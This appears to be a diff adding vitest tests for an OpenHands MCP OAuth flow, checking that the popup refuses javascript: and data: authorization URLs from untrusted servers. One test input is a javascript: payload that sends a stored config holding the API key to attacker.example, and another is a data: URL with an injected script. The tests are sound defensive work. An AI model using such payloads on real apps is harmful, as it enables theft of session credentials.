@@ -1,4 +1,4 @@
-import { beforeEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { MCPClient } from "@openhands/typescript-client/clients";
 import {
   setActiveSelection,
@@ -234,5 +234,113 @@ describe("McpService.testServer", () => {
 
     expect(getOAuthStatus).toHaveBeenCalledWith("job/1");
     expect(close).toHaveBeenCalledTimes(1);
+  });
+});
+
+describe("McpService.authorizeOAuth", () => {
+  const oauthServer = {
+    id: "shttp-0",
+    type: "shttp" as const,
+    name: "untrusted-mcp",
+    url: "https://mcp.example.com/mcp",
+    auth: {
+      strategy: "oauth2" as const,
+      authentication: {
+        type: "oauth" as const,
+        client_auth_method: "none" as const,
+      },
+    },
+  };
+
+  function makePopup() {
+    const popup = {
+      location: { href: "about:blank" },
+      close: vi.fn(),
+      closed: false,
+    };
+    vi.spyOn(window, "open").mockReturnValue(popup as unknown as Window);
+    return popup;
+  }
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    setRegisteredBackends([
+      {
+        id: "local",
+        name: "Local",
+        host: "http://127.0.0.1:8001",
+        apiKey: "session-key",
+        kind: "local",
+      },
+    ]);
+    setActiveSelection({ backendId: "local", orgId: null });
+    vi.mocked(MCPClient).mockImplementation(function MockMCPClient() {
+      return {
+        testServer,
+        startOAuth,
+        getOAuthStatus,
+        submitOAuthCallback,
+        close,
+      } as unknown as MCPClient;
+    } as unknown as typeof MCPClient);
+    getOAuthStatus.mockResolvedValue({
+      ok: true,
+      status: "pending",
+      job_id: "job-1",
+      callback_ready: true,
+    });
+  });
+
+  afterEach(() => {
+    vi.restoreAllMocks();
+  });
+
+  // The authorization URL comes from the (untrusted) MCP server. The popup is
+  // a same-origin `about:blank`, so navigating it to `javascript:` would run
+  // that script in the Canvas origin — where the session API key lives.
+  it.each([
+    "javascript:fetch('https://attacker.example/'+localStorage.getItem('openhands-agent-server-config'))",
+    "data:text/html,<script>window.pwned=1</script>",
+  ])("refuses to navigate the popup to %s", async (authorizationUrl) => {
+    const popup = makePopup();
+    startOAuth.mockResolvedValue({
+      ok: true,
+      job_id: "job-1",
+      authorization_url: authorizationUrl,
+    });
+
+    const result = await McpService.authorizeOAuth(oauthServer);
+
+    expect(popup.location.href).toBe("about:blank");
+    expect(popup.close).toHaveBeenCalled();
+    expect(result.ok).toBe(false);
+  });
+
+  it("navigates the popup to an https authorization URL", async () => {
+    const popup = makePopup();
+    startOAuth.mockResolvedValue({
+      ok: true,
+      job_id: "job-1",
+      authorization_url: "https://auth.example.com/authorize?client_id=abc",
+    });
+    getOAuthStatus
+      .mockResolvedValueOnce({
+        ok: true,
+        status: "pending",
+        job_id: "job-1",
+        callback_ready: true,
+      })
+      .mockResolvedValue({
+        ok: true,
+        status: "succeeded",
+        job_id: "job-1",
+        tools: ["search"],
+      });
+
+    await McpService.authorizeOAuth(oauthServer);
+
+    expect(popup.location.href).toBe(
+      "https://auth.example.com/authorize?client_id=abc",
+    );
   });
 });
